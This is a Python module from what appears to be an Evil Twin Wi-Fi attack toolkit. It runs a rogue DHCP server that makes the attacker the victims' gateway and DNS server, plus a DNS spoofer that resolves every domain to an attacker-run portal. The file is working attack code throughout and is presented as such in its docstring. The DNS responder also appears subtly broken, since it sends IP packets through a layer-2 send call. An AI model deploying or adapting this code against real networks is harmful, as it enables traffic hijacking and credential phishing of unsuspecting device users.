"""
dns_dhcp.py - Lightweight DHCP and DNS responders for Evil Twin attacks.
Allows target devices to get an IP and redirect all traffic to the portal.
"""

from scapy.all import DHCP, BOOTP, IP, UDP, Ether, DNS, DNSRR, DNSQR, sendp, sniff, get_if_addr, get_if_hwaddr
import threading
import time
from rich.console import Console

console = Console()

class FakeNetworkServices:
    def __init__(self, interface, portal_ip=None):
        self.interface = interface
        self.portal_ip = portal_ip or get_if_addr(interface)
        self.mac = get_if_hwaddr(interface)
        self.stop_event = threading.Event()
        self.assigned_ips = {} # MAC -> IP

    def start_dhcp(self):
        """Responds to DHCP requests to assign IPs locally."""
        def dhcp_responder():
            console.print(f"[bold green]🔌 DHCP Server started on {self.interface}...[/]")
            def handle_dhcp(pkt):
                if pkt.haslayer(DHCP):
                    msg_type = next((opt[1] for opt in pkt[DHCP].options if opt[0] == 'message-type'), None)
                    
                    # DHCP Discover -> Offer
                    if msg_type == 1:
                        target_mac = pkt[Ether].src
                        offered_ip = f"10.0.0.{len(self.assigned_ips) + 10}"
                        self.assigned_ips[target_mac] = offered_ip
                        
                        resp = (Ether(src=self.mac, dst=target_mac) /
                                IP(src=self.portal_ip, dst="255.255.255.255") /
                                UDP(sport=67, dport=68) /
                                BOOTP(op=2, yiaddr=offered_ip, siaddr=self.portal_ip, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                                DHCP(options=[("message-type", "offer"), ("server_id", self.portal_ip), ("subnet_mask", "255.255.255.0"), ("router", self.portal_ip), "end"]))
                        sendp(resp, iface=self.interface, verbose=False)
                    
                    # DHCP Request -> Ack
                    elif msg_type == 3:
                        target_mac = pkt[Ether].src
                        assigned_ip = self.assigned_ips.get(target_mac, f"10.0.0.{len(self.assigned_ips) + 10}")
                        
                        resp = (Ether(src=self.mac, dst=target_mac) /
                                IP(src=self.portal_ip, dst="255.255.255.255") /
                                UDP(sport=67, dport=68) /
                                BOOTP(op=2, yiaddr=assigned_ip, siaddr=self.portal_ip, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                                DHCP(options=[("message-type", "ack"), ("server_id", self.portal_ip), ("lease_time", 3600), ("router", self.portal_ip), ("name_server", self.portal_ip), "end"]))
                        sendp(resp, iface=self.interface, verbose=False)

            sniff(iface=self.interface, filter="udp and (port 67 or 68)", prn=handle_dhcp, stop_filter=lambda _: self.stop_event.is_set(), store=False)

        threading.Thread(target=dhcp_responder, daemon=True).start()

    def start_dns(self):
        """Redirects all DNS queries to the portal IP."""
        def dns_responder():
            console.print(f"[bold cyan]🔍 DNS Reductor started (All -> {self.portal_ip})...[/]")
            def handle_dns(pkt):
                if pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
                    qname = pkt[DNSQR].qname
                    resp = (IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                an=DNSRR(rrname=qname, ttl=10, rdata=self.portal_ip)))
                    sendp(resp, iface=self.interface, verbose=False)

            sniff(iface=self.interface, filter="udp port 53", prn=handle_dns, stop_filter=lambda _: self.stop_event.is_set(), store=False)

        threading.Thread(target=dns_responder, daemon=True).start()

    def stop(self):
        self.stop_event.set()
        console.print("[yellow]⏹ Fake network services stopped.[/]")
